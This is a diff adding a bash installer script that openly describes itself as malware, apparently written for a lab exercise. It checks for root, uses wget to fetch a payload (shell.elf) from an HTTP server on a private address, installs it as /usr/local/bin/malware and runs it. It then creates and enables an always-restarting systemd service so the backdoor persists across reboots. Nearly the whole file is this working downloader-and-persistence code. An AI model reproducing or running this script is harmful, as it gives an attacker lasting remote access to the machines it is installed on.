@@ -1,0 +1,58 @@
+#!/bin/bash
+
+# Welcome to my auto installing malware! Please enter the following
+# commands to install this program! "chmod +x install.sh", then
+# "sudo ./install.sh"
+
+# After that, the program will take care of itself! Now you don't
+# have to worry about NOT being hacked, because I will always
+# have a backdoor into your system! Thanks for downloading!
+
+# On a serious note, this program will grab the payload off the
+# http server this file was grabbed from.
+# After that the payload is moved to /usr/local/bin due to it
+# being a somewhat secretive location.
+# The payload is renamed malware, so it is easily identified.
+# Because the install.sh is run as sudo the chmod command and
+# all of the other commands that require root privileges should work.
+# The malware should be run immediately on install and this file
+# will create a daemon that will create a backdoor into this system
+# on boot.
+
+# A friendly reminder that this must be run as sudo
+if [ "$EUID" -ne 0 ]; then
+    echo "Please run this install file with sudo or as root."
+    exit 1
+fi
+
+# download payload off http server. This also moves the file to the /usr dir
+wget http://192.168.56.102:8000/shell.elf -O /usr/local/bin/malware
+
+# make the payload executable
+chmod +x /usr/local/bin/malware
+
+# run the payload immediately in the background
+/usr/local/bin/malware &
+
+# creates a systemd service file for persistence
+cat << EOF > /etc/systemd/system/malware.service
+[Unit]
+Description=Malware Service
+
+[Service]
+ExecStart=/usr/local/bin/malware
+Restart=always
+User=$(whoami)
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# reload systemd daemon to start up new malware daemon
+systemctl daemon-reload
+
+# enable new daemon to start on boot
+systemctl enable malware.service
+
+# start the new malware daemon
+systemctl start malware.service
